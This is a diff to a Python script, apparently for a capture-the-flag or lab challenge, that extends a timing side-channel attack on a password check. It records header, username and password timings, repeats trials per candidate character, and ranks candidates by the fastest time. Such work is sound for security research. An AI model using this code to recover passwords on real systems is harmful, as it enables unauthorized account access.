@@ -1,4 +1,5 @@
 # pylint: disable=global-statement,invalid-name,wildcard-import,unused-wildcard-import,pointless-string-statement
+from collections import defaultdict
 import sys
 import socket
 import select
@@ -392,12 +393,13 @@ def try_password(pw):
     out = out.decode("utf8").rstrip()
     print(out)
 
-    _pw, un_time_ns, pw_time_ns, succ = out.split(", ")
+    _pw, header_time_ns, un_time_ns, pw_time_ns, succ = out.split(", ")
     assert pw == _pw
+    header_time_ns = int(header_time_ns)
     un_time_ns = int(un_time_ns)
     pw_time_ns = int(pw_time_ns)
 
-    return un_time_ns, pw_time_ns, succ
+    return header_time_ns, un_time_ns, pw_time_ns, succ
 
 
 def try_passwords(prefix):
@@ -406,8 +408,8 @@ def try_passwords(prefix):
 
     for ch in sorted(chrs):
         pw = prefix + ch
-        un_time_ns, pw_time_ns, succ = try_password(pw)
-        timings[pw] = un_time_ns, pw_time_ns,
+        header_time_ns, un_time_ns, pw_time_ns, succ = try_password(pw)
+        timings[pw] = header_time_ns, un_time_ns, pw_time_ns,
         if succ == "true":
             print("Successful password??", pw)
             raise Exception("Yay!", pw)
@@ -415,23 +417,21 @@ def try_passwords(prefix):
     return timings
 
 
-def compare_timings(ts):
-    min_timing = {pw: min(t[pw] for t in ts) for pw in ts[0]}
+def try_passwords_ntimes(prefix, ntimes=10):
+    best_timings = defaultdict(lambda: 0xffffffffffffffffffffffffffff)
+    full_data = defaultdict(list)
 
-    pws = list(min_timing.keys())
-    pws = sorted(pws, key=min_timing.get, reverse=True)
+    for i in range(ntimes):
+        print(f"=== Iteration {i} ===")
+        timings = try_passwords(prefix)
+        for pw, dt in timings.items():
+            pw_time = dt[2]
+            best_timings[pw] = min(best_timings[pw], pw_time)
+            full_data[pw].append(dt)
 
-    best_time = min_timing[pws[0]]
-    snd_best_time = min_timing[pws[1]]
+    print(sorted(best_timings.items(), key=lambda kv: kv[1]))
 
-    for pw in pws:
-        print(f"Pw {pw} took {min_timing[pw]}")
-
-    print(f"Best pw     = {pws[0]} with time {best_time}")
-    print(f"Second best = {pws[1]} with time {snd_best_time}")
-    print(f"Difference of {best_time - snd_best_time}")
-
-    return pws[0], best_time
+    return best_timings, full_data
 
 
 def test_syscall(n, rs=None):
